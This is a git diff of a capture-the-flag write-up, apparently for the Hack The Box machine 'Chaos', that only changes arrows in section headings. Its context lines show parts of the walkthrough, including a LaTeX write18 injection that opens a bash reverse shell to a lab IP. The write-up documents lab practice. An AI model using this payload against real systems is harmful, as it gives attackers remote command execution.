@@ -67,7 +67,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 I added `chaos.htb` to my `/etc/hosts` file since there's a DNS name returned from the above scan.&#x20;
 
-### Web Enum --> Mail Creds
+### Web Enum -> Mail Creds
 
 Visiting the IP address alone blocks us:
 
@@ -113,7 +113,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 2023/08/05 13:12:44 Starting gobuster in directory enumeration mode
 ===============================================================
-/wp                   (Status: 301) [Size: 313] [--> http://10.129.253.192/wp/]
+/wp                   (Status: 301) [Size: 313] [-> http://10.129.253.192/wp/]
 ```
 
 The Wordpress site was rather simple as well, and just contained one locked article:
@@ -143,7 +143,7 @@ Using the credentials we found earlier, we can login to view the dashboard:
 
 <figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
-### Webmail Files --> Hidden URL
+### Webmail Files -> Hidden URL
 
 Within the Drafts of the user, I found one message with 2 files called `enim_msg.txt` and `en.py`:
 
@@ -225,7 +225,7 @@ Thanks,
 Ayush
 ```
 
-### PDF --> RCE
+### PDF -> RCE
 
 The URL shows a PDF maker thing:
 
@@ -249,7 +249,7 @@ Using `\immediate\write18{bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'}` w
 
 ## Privilege Escalation
 
-### Ayush Shell --> Shell Escape
+### Ayush Shell -> Shell Escape
 
 There are 2 users present within the machine:
 
@@ -318,7 +318,7 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 <figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
 
-### Mozilla Creds --> Root
+### Mozilla Creds -> Root
 
 The `ayush` user has a `.mozilla` folder present in their home directory:
 
